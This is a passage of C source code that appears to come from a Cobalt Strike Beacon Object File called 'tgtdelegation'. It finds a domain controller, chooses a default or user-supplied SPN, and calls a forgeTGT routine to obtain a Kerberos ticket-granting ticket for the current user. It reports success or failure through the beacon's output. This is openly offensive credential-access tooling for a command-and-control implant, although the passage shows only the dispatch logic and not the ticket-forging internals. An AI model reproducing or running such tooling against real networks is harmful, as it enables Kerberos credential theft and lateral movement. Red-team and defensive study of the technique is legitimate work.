					wchar_t* spnArg = (wchar_t*)createTicket(domaincontrollerArg);

					// Get the TGT in Kerberos cache
					int getTGT = forgeTGT(spnArg, jobNonce);

					// Error handling
					if (getTGT == 1)
					{
						BeaconPrintf(CALLBACK_ERROR, "Error! tgtdelegation failed!\n");
					}
					else if (getTGT == 0)
					{
						BeaconPrintf(CALLBACK_OUTPUT, "[+] tgtdelegation succeeded!\n");
					}
				}
				else
				{
					// A SPN was specified. Use it to forge the TGT
					BeaconPrintf(CALLBACK_OUTPUT, "[+] Target SPN: %S\n", usersuppliedSpn);

					// Get the TGT in Kerberos cache
					int getTGT = forgeTGT(usersuppliedSpn, jobNonce);

					// Error handling
					if (getTGT == 1)
					{
						BeaconPrintf(CALLBACK_ERROR, "Error! tgtdelegation failed!\n");
					}
					else if (getTGT == 0)
					{
						BeaconPrintf(CALLBACK_OUTPUT, "[+] tgtdelegation succeeded!\n");
					}
				}
			}
		}
	}
	else
	{
		// If execution reaches here, a domain was specified. Use it to get a TGT
		LPCWSTR domaincontrollerArg = getDC(domainnameArg);

		// Error handling
		if (MSVCRT$wcscmp((const wchar_t*)domaincontrollerArg, L"ERROR") == 0)
		{
			BeaconPrintf(CALLBACK_ERROR,"Error! tgtdelegation failed!\n");
		}
		else
		{
			// Was a SPN specified?
			if (MSVCRT$wcscmp((const wchar_t*)usersuppliedSpn, L"default") == 0)
			{
				BeaconPrintf(CALLBACK_OUTPUT,"[+] No SPN specified! Using default SPN...\n");

				// Get the default SPN, since no user-supplied SPN was specified
				wchar_t* spnArg = (wchar_t*)createTicket(domaincontrollerArg);

				// Get the TGT in Kerberos cache
				int getTGT = forgeTGT(spnArg, jobNonce);

				// Error handling
				if (getTGT == 1)
				{
					BeaconPrintf(CALLBACK_ERROR, "Error! tgtdelegation failed!\n");
				}
				else if (getTGT == 0)
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] tgtdelegation succeeded!\n");
				}
			}
			else
			{
				// A SPN was specified. Use it to forge the TGT
				BeaconPrintf(CALLBACK_OUTPUT, "[+] Target SPN: %S\n", usersuppliedSpn);

				// Get the TGT in Kerberos cache
				int getTGT = forgeTGT(usersuppliedSpn, jobNonce);

				// Error handling
				if (getTGT == 1)
				{
					BeaconPrintf(CALLBACK_ERROR, "Error! tgtdelegation failed!\n");
				}
				else if (getTGT == 0)
				{
					BeaconPrintf(CALLBACK_OUTPUT, "[+] tgtdelegation succeeded!\n");
				}
			}
		}
	}
}
